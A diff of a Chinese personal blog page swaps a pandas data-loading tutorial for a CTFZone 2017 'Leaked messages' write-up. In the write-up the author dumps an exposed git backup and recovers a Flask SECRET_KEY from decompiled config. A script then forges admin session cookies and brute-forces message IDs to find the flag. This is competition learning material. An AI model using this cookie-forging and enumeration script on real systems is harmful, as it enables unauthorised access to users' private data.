@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="数据挖掘,天池比赛," />
+  <meta name="keywords" content="CTF,writeup,web,CTFZone," />
 
 
 
@@ -89,26 +89,23 @@
 
 
 
-<meta name="description" content="接触大数据比赛，必然要接触大数据（&amp;lt;—好吧废话）所以第一道门槛是如何读取大数据文件。有时比赛提供的dataset是带有标签的csv格式文件，有时也会提供不带标签的普通txt文件，此文主要写写对读取此种txt文件的一些小方法和处理。">
+<meta name="description" content="CTFZone-2017-Leaked messages-writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="数据挖掘比赛（1）对无列名的txt数据集读取方法及处理">
-<meta property="og:url" content="http://yoursite.com/2017/01/24/数据挖掘比赛（1）对无列名的txt数据集读取方法及处理/index.html">
+<meta property="og:title" content="CTFZone-2017-Leaked messages-writeup">
+<meta property="og:url" content="http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="接触大数据比赛，必然要接触大数据（&amp;lt;—好吧废话）所以第一道门槛是如何读取大数据文件。有时比赛提供的dataset是带有标签的csv格式文件，有时也会提供不带标签的普通txt文件，此文主要写写对读取此种txt文件的一些小方法和处理。">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/titanic.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/titanic%E8%AF%BB%E5%85%A5%E5%90%8E.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/user_view.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%85%A5user_view.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/user_view%E5%88%B6%E5%AE%9Aheader=0.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/%E6%9C%AA%E5%88%B6%E5%AE%9Asep%E6%93%8D%E4%BD%9C.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/%E5%88%B6%E5%AE%9Asep%E5%90%8E%E6%93%8D%E4%BD%9C.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/%E6%8C%87%E5%AE%9Anames.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/%E5%B1%9E%E6%80%A7columns.jpg">
-<meta property="og:updated_time" content="2017-06-20T03:29:51.007Z">
+<meta property="og:description" content="CTFZone-2017-Leaked messages-writeup">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/3.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/4.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/5.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/1.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/2.jpg?raw=true">
+<meta property="og:image" content="https://s17.postimg.org/l2c0pul25/photo_2017-07-14_18-44-51.jpg">
+<meta property="og:updated_time" content="2017-07-19T08:46:03.151Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="数据挖掘比赛（1）对无列名的txt数据集读取方法及处理">
-<meta name="twitter:description" content="接触大数据比赛，必然要接触大数据（&amp;lt;—好吧废话）所以第一道门槛是如何读取大数据文件。有时比赛提供的dataset是带有标签的csv格式文件，有时也会提供不带标签的普通txt文件，此文主要写写对读取此种txt文件的一些小方法和处理。">
-<meta name="twitter:image" content="http://ojp0pjljj.bkt.clouddn.com/titanic.jpg">
+<meta name="twitter:title" content="CTFZone-2017-Leaked messages-writeup">
+<meta name="twitter:description" content="CTFZone-2017-Leaked messages-writeup">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/3.jpg?raw=true">
 
 
 
@@ -136,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/01/24/数据挖掘比赛（1）对无列名的txt数据集读取方法及处理/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/"/>
 
 
 
 
 
-  <title> 数据挖掘比赛（1）对无列名的txt数据集读取方法及处理 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> CTFZone-2017-Leaked messages-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -308,7 +305,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/01/24/数据挖掘比赛（1）对无列名的txt数据集读取方法及处理/">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -332,7 +329,7 @@
             
             
               
-                数据挖掘比赛（1）对无列名的txt数据集读取方法及处理
+                CTFZone-2017-Leaked messages-writeup
               
             
           </h1>
@@ -347,8 +344,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-24T22:12:15+08:00">
-                2017-01-24
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-19T16:44:14+08:00">
+                2017-07-19
               </time>
             
 
@@ -370,8 +367,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/数据挖掘/" itemprop="url" rel="index">
-                    <span itemprop="name">数据挖掘</span>
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
                   </a>
                 </span>
 
@@ -389,7 +386,7 @@
 
           
           
-             <span id="/2017/01/24/数据挖掘比赛（1）对无列名的txt数据集读取方法及处理/" class="leancloud_visitors" data-flag-title="数据挖掘比赛（1）对无列名的txt数据集读取方法及处理">
+             <span id="/2017/07/19/CTFZone-2017-Leaked-messages-writeup/" class="leancloud_visitors" data-flag-title="CTFZone-2017-Leaked messages-writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -416,53 +413,28 @@
       
 
       
-        <p>接触大数据比赛，必然要接触大数据（&lt;—好吧废话）所以第一道门槛是如何读取大数据文件。有时比赛提供的dataset是带有标签的csv格式文件，有时也会提供不带标签的普通txt文件，此文主要写写对读取此种txt文件的一些小方法和处理。<br><a id="more"></a></p>
-<h1 id="基本的读入"><a href="#基本的读入" class="headerlink" title="基本的读入"></a>基本的读入</h1><p>其实python里已经集成了csv模块了，不过使用起来不那么方便。一般而言，使用pandas库可以把数据读入成dataframe形式方便操作。</p>
-<h2 id="读入csv文件"><a href="#读入csv文件" class="headerlink" title="读入csv文件"></a>读入csv文件</h2><p>以kaggle的titanic数据集为例<br><img src="http://ojp0pjljj.bkt.clouddn.com/titanic.jpg" alt="titanic数据集集合"><br>用pandas读入的代码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</div><div class="line">titanic_db = pd.read_csv(<span class="string">'titanic_train.csv'</span>)</div></pre></td></tr></table></figure></p>
-<p>这样就能把数据集读进来了，如下：<br><img src="http://ojp0pjljj.bkt.clouddn.com/titanic%E8%AF%BB%E5%85%A5%E5%90%8E.jpg" alt="利用pandas读入csv文件"><br>几道’\’是可能因为屏幕小（，，ԾㅂԾ，，）而产生的换行提示。显示出来的有5行（0~5），每行的上面都有对应的列名。</p>
-<h2 id="读入txt文件"><a href="#读入txt文件" class="headerlink" title="读入txt文件"></a>读入txt文件</h2><p>以IJCAI-17比赛数据集中的user_view.txt为例notepad++打开如下：<br><img src="http://ojp0pjljj.bkt.clouddn.com/user_view.jpg" alt=""><br>用pandas读入的代码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</div><div class="line">user_view = pd.read_table(<span class="string">'user_view.txt'</span>)</div></pre></td></tr></table></figure></p>
-<p>注意代码应该是　read_table .结果如下<br><img src="http://ojp0pjljj.bkt.clouddn.com/%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%85%A5user_view.jpg" alt="利用pandas读入txt文件"><br>可以看到读入后，pandas把txt文件的第一行当做了列名，很明显这是错误的:) 这个我们下面来进行修正。</p>
-<h1 id="针对无列名文件第一行的读入处理"><a href="#针对无列名文件第一行的读入处理" class="headerlink" title="针对无列名文件第一行的读入处理"></a>针对无列名文件第一行的读入处理</h1><p>上面提到的 read_csv 、read_table 等，其实他们的参数不仅仅只有一个。为了让无列名的数据读入正确，我们可以在读入的时候多指定一个参数header=None。以user_view.txt为例。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user_view = pd.read_table(<span class="string">'user_view.txt'</span>，header=<span class="keyword">None</span>)</div></pre></td></tr></table></figure></p>
-<p>读入结果如下：<br><img src="http://ojp0pjljj.bkt.clouddn.com/user_view%E5%88%B6%E5%AE%9Aheader=0.jpg" alt="制定header读入user_view.txt"></p>
-<p>可以看到读入后，原txt文件中的第一行有了Index（即 0），不再被识别为列名。</p>
-<h1 id="对txt数据集读入处理为正常的dataframe形式"><a href="#对txt数据集读入处理为正常的dataframe形式" class="headerlink" title="对txt数据集读入处理为正常的dataframe形式"></a>对txt数据集读入处理为正常的dataframe形式</h1><p>在指定header=None读入txt文件后，pandas自动给添了个列名 0，这表明读入的每一行其实都是读入了一字符串，总共只有 1 列！对数据的操作很不方便<br><img src="http://ojp0pjljj.bkt.clouddn.com/%E6%9C%AA%E5%88%B6%E5%AE%9Asep%E6%93%8D%E4%BD%9C.jpg" alt=""></p>
-<p>所以我们在遇到这种情况时，我们还要继续指定参数sep，告诉pandas以什么为分隔符。以user_view.txt为例，从上图可知每行的数据有三个部分，用逗号(，)相隔开。所以在读入时，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user_view = pd.read_table(<span class="string">'user_view.txt'</span>，header=<span class="keyword">None</span>，sep=<span class="string">'，'</span>)</div></pre></td></tr></table></figure></p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/%E5%88%B6%E5%AE%9Asep%E5%90%8E%E6%93%8D%E4%BD%9C.jpg" alt=""><br>可以发现每列（3列）的列名被设置为 0 1 2，这样我们可以很方便地对数据进行操作。</p>
-<h1 id="给无列名的数据集添加列名"><a href="#给无列名的数据集添加列名" class="headerlink" title="给无列名的数据集添加列名"></a>给无列名的数据集添加列名</h1><h2 id="法一：直接操作"><a href="#法一：直接操作" class="headerlink" title="法一：直接操作"></a>法一：直接操作</h2><p>好吧，这个方法当然是最简单的，csv用excel打开，txt用notepad++、sublime打开，然后自己填上列名，再正常读入就行了嘛!</p>
-<p>只是通常情况下，所遇到的数据集比较大，用excel或者notepad等难以打开，又或者打开后不好操作，局限性比较大。同时在直接操作添加时还要考虑原数据集的格式和编码，方便后面进一步读入。</p>
-<h2 id="法二：在利用pandas读入时指定列名"><a href="#法二：在利用pandas读入时指定列名" class="headerlink" title="法二：在利用pandas读入时指定列名"></a>法二：在利用pandas读入时指定列名</h2><p>以user_view.txt数据集为例，阿里天池上的数据说明是</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th style="text-align:right">Sample</th>
-<th style="text-align:center">Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>user_id</td>
-<td style="text-align:right">0000000001</td>
-<td style="text-align:center">用户id</td>
-</tr>
-<tr>
-<td>shop_id</td>
-<td style="text-align:right">000001</td>
-<td style="text-align:center">商家id，与shop_info对应</td>
-</tr>
-<tr>
-<td>time_stamp</td>
-<td style="text-align:right">2015-10-10 10:00:00</td>
-<td style="text-align:center">浏览时间</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>所以在读入时，我们可以再指定一个参数 names .对照上述说明和基于前面的操作()，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</div><div class="line">columns = [<span class="string">'user_id'</span>,<span class="string">'shop_id'</span>,<span class="string">'time_stamp'</span>]</div><div class="line">user_view_db =  user_view_db =  pd.read_table(<span class="string">'user_view.txt'</span>,header=<span class="keyword">None</span>,sep=<span class="string">','</span>,names=columns)</div></pre></td></tr></table></figure></p>
-<p>结果如下：<br><img src="http://ojp0pjljj.bkt.clouddn.com/%E6%8C%87%E5%AE%9Anames.jpg" alt=""></p>
-<h2 id="法三：在用pandas读入后再制定列名"><a href="#法三：在用pandas读入后再制定列名" class="headerlink" title="法三：在用pandas读入后再制定列名"></a>法三：在用pandas读入后再制定列名</h2><p>在完成如前面基本的读入和处理后，此时 user_view_db 应该是 列名为[0,1,2] 的datframe了。此时我们再通过指定其属性columns来指定列名。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user_view_db.columns=[<span class="string">'user_id'</span>,<span class="string">'shop_id'</span>,<span class="string">'time_stamp'</span>]</div></pre></td></tr></table></figure></p>
-<p>如下：<br><img src="http://ojp0pjljj.bkt.clouddn.com/%E5%B1%9E%E6%80%A7columns.jpg" alt="利用columns属性"></p>
+        <p>CTFZone-2017-Leaked messages-writeup<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">One of our candidates used to send restricted data to colleagues via this service</div><div class="line">because it&apos;s free and easy to use.</div><div class="line">Try to get some secrets which can compromise them.</div><div class="line">82.202.204.104</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/3.jpg?raw=true" alt=""><br>先注册一个账号，登陆</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/4.jpg?raw=true" alt=""></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/5.jpg?raw=true" alt=""></p>
+<p>御剑扫出目录：<a href="http://82.202.204.104/backup/" target="_blank" rel="external">http://82.202.204.104/backup/</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/1.jpg?raw=true" alt=""></p>
+<p>看文件，猜测是git泄露。用lijiejie的Githack只能下载到文件，没办法git log，而rip-git.pl提示说<code>[!] No more items to fetch. That&#39;s it!</code>，所以最后使用的工具是<a href="https://github.com/internetwache/GitTools" target="_blank" rel="external">GitTools</a>，不过如果直接用的话，会提示说没有找到<code>.git</code>目录，可以先将gitdumper.sh中以下代码去掉：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if [[ ! &quot;$BASEURL&quot; =~ /.git/$ ]]; then</div><div class="line">    echo -e &quot;\e[31m[-] /.git/ missing in url\e[0m&quot;;</div><div class="line">    exit 0;</div><div class="line">fi</div></pre></td></tr></table></figure></p>
+<p>执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/gitdumper.sh  http://82.202.204.104/backup/ dumper_LeakMessages</div></pre></td></tr></table></figure></p>
+<p>之后查看git log，如下命令,其中<code>--no-paper</code>禁用paper分页，发现有flag.txt：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git --no-pager log -p -1</div></pre></td></tr></table></figure></p>
+<p>得到如下结果：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/2.jpg?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import base64</div><div class="line">&gt;&gt;&gt; base64.b32decode(&quot;MN2GM6TPNZSXW63IOR2HA4Z2F4XXS33VOR2WEZJOMNXW2L3XMF2GG2B7OY6UOMKJMJJHK2TLN4WUC7L5&quot;)</div><div class="line">&apos;ctfzone&#123;&#123;https://youtube.com/watch?v=G1IbRujko-A&#125;&#125;&apos;</div></pre></td></tr></table></figure>
+<p>可惜，这是个假的flag。接下来利用extractor.sh 将历次commit的内容恢复出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">../Extractor/extractor.sh dumper_LeakMessages/  extra_Leakmessages</div></pre></td></tr></table></figure></p>
+<p>目录结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">├── 0-bd55b19e5413ce609d3bc4429c3a6f272341988a</div><div class="line">│   ├── commit-meta.txt</div><div class="line">│   ├── config.pyc</div><div class="line">│   ├── requirements.txt</div><div class="line">│   └── templates</div><div class="line">│       ├── index.html</div><div class="line">│       ├── login.html</div><div class="line">│       ├── messages.html</div><div class="line">│       └── register.html</div><div class="line">├── 1-8b1084b23d869e5dc1ae4ac845589ecfb896c0c3</div><div class="line">│   ├── commit-meta.txt</div><div class="line">│   ├── requirements.txt</div><div class="line">│   ├── static</div><div class="line">│   │   ├── css</div><div class="line">│   │   │   ├── bootstrap.min.css</div><div class="line">│   │   │   ├── login.css</div><div class="line">│   │   │   ├── main.css</div><div class="line">│   │   │   └── material-input.css</div><div class="line">│   │   ├── flag.txt</div><div class="line">│   │   └── js</div><div class="line">│   │       └── bootstrap.min.js</div><div class="line">│   └── templates</div><div class="line">│       ├── index.html</div><div class="line">│       ├── login.html</div><div class="line">│       ├── messages.html</div><div class="line">│       └── register.html</div><div class="line">└── 2-9f848cceeba31da2cbd2c8ecaebb8a8dab17eee4</div><div class="line">    ├── commit-meta.txt</div><div class="line">    ├── requirements.txt</div><div class="line">    ├── static</div><div class="line">    │   ├── css</div><div class="line">    │   │   ├── bootstrap.min.css</div><div class="line">    │   │   ├── login.css</div><div class="line">    │   │   ├── main.css</div><div class="line">    │   │   └── material-input.css</div><div class="line">    │   └── js</div><div class="line">    │       └── bootstrap.min.js</div><div class="line">    └── templates</div><div class="line">        ├── index.html</div><div class="line">        ├── login.html</div><div class="line">        ├── messages.html</div><div class="line">        └── register.html</div></pre></td></tr></table></figure></p>
+<p>先读取一下requirements.txt，知道是flask应用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cat requirements.txt</div><div class="line">flask</div><div class="line">flask_recaptcha</div></pre></td></tr></table></figure></p>
+<p>其中的<code>config.pyc</code>是其配置文件。利用<a href="https://github.com/rocky/python-uncompyle6" target="_blank" rel="external">uncompyle6</a>进行反汇编：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/test# uncompyle6 config.pyc</div><div class="line"># uncompyle6 version 2.11.2</div><div class="line"># Python bytecode 3.6 (3379)</div><div class="line"># Decompiled from: Python 2.7.13 (default, Jan 19 2017, 14:48:08)</div><div class="line"># [GCC 6.3.0 20170118]</div><div class="line"># Embedded file name: config.py</div><div class="line"># Compiled at: 2017-07-15 01:28:42</div><div class="line"># Size of source mod 2**32: 288 bytes</div><div class="line"></div><div class="line"></div><div class="line">class BaseConfig(object):</div><div class="line">    DEBUG = False</div><div class="line">    SECRET_KEY = &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos;</div><div class="line">    DB_NAME = &apos;messages.db&apos;</div><div class="line">    RECAPTCHA_ENABLED = True</div><div class="line">    RECAPTCHA_THEME = &apos;dark&apos;</div><div class="line">    RECAPTCHA_TYPE = &apos;image&apos;</div><div class="line">    RECAPTCHA_SIZE = &apos;normal&apos;</div><div class="line">    RECAPTCHA_RTABINDEX = 10</div><div class="line"># okay decompiling config.pyc</div></pre></td></tr></table></figure></p>
+<p><code>SECRET_KEY</code>用于生成flask session。可以用<a href="https://github.com/noraj1337/flask-session-cookie-manager" target="_blank" rel="external">Flask Session Cookie Decoder/Encoder</a>进行解密。比如前面用burp抓包得到的session：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">session=eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA</div></pre></td></tr></table></figure></p>
+<p>对其进行解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py decode -c &quot;eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA&quot; -s &quot;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&quot;  </div><div class="line">&#123;u&apos;username&apos;: u&apos;chybeta&apos;, u&apos;number&apos;: u&apos;326410031726&apos;&#125;</div></pre></td></tr></table></figure></p>
+<p>现在我们就可以利用这个脚本来伪造cookie了，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py encode -s &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos; -t &apos;&#123;&quot;username&quot;:&quot;chybeta&quot;,&quot;number&quot;:&quot;326410031725&quot;&#125;&apos;</div><div class="line"></div><div class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOekkxIn0sInVzZXJuYW1lIjp7IiBiIjoiWTJoNVltVjBZUT09In19.DEh3qQ.yq3ZCE5Mpoy74D9e3wkfbbenU1E</div></pre></td></tr></table></figure></p>
+<p>现在我们利用下面这个脚本，来获取admin的各条信息，number的上下限是通过测试出来的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># standard imports</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> zlib</div><div class="line"><span class="keyword">import</span> ast</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</div><div class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></div><div class="line">        self.secret_key = secret_key</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_cookie_encoder</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        app = MockApp(secret_key)</div><div class="line">        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</div><div class="line">        si = SecureCookieSessionInterface()</div><div class="line">        s = si.get_signing_serializer(app)</div><div class="line"></div><div class="line">        <span class="keyword">return</span> s.dumps(session_cookie_structure)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">return</span> <span class="string">"[Encoding error]&#123;&#125;"</span>.format(e)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    number_min = <span class="number">326410000000</span></div><div class="line">    number_max = <span class="number">326410030240</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> number <span class="keyword">in</span>  range(number_min,number_max):</div><div class="line">        file_message = open(<span class="string">"message.txt"</span>,<span class="string">'w'</span>)</div><div class="line">        secret_key = <span class="string">".&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d"</span></div><div class="line">        cookie_structure = <span class="string">"&#123;'username':'admin','number':"</span>+ str(number) + <span class="string">"&#125;"</span></div><div class="line">        session  = session_cookie_encoder(secret_key, cookie_structure)</div><div class="line">        cookie = &#123;<span class="string">'session'</span>:session&#125;</div><div class="line">        url = <span class="string">"http://82.202.204.104/messages"</span></div><div class="line">        content = requests.get(url,cookies=cookie)</div><div class="line">        start_index = content.text.find(<span class="string">'&lt;span class="message"&gt;'</span>)+len(<span class="string">'&lt;span class="message"&gt;'</span>)</div><div class="line">        end_index = content.text.find(<span class="string">'&lt;/span&gt;\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">"You have no messages yet"</span> <span class="keyword">not</span> <span class="keyword">in</span> content.text:</div><div class="line">            <span class="keyword">print</span> number</div><div class="line">            file_message.writelines(str(number)+<span class="string">":"</span>+str(content.text[start_index:end_index]))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line"></div><div class="line">file_message.close()</div></pre></td></tr></table></figure></p>
+<p>在message.txt中查找：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# cat message.txt | grep &quot;http&quot;</div><div class="line">It&amp;#39;s so cool! https://postimg.org/image/41t4h680r/</div></pre></td></tr></table></figure></p>
+<p><img src="https://s17.postimg.org/l2c0pul25/photo_2017-07-14_18-44-51.jpg" alt=""><br>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ctfzone&#123;b1d4207ff1965105af775cfa71d8214d&#125;</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -475,12 +447,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2017/01/24/数据挖掘比赛（1）对无列名的txt数据集读取方法及处理/">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></p>
+  <p><span>本文标题:</span><a href="/2017/07/19/CTFZone-2017-Leaked-messages-writeup/">CTFZone-2017-Leaked messages-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
-  <p><span>发布时间:</span>2017年01月24日 - 22:01</p>
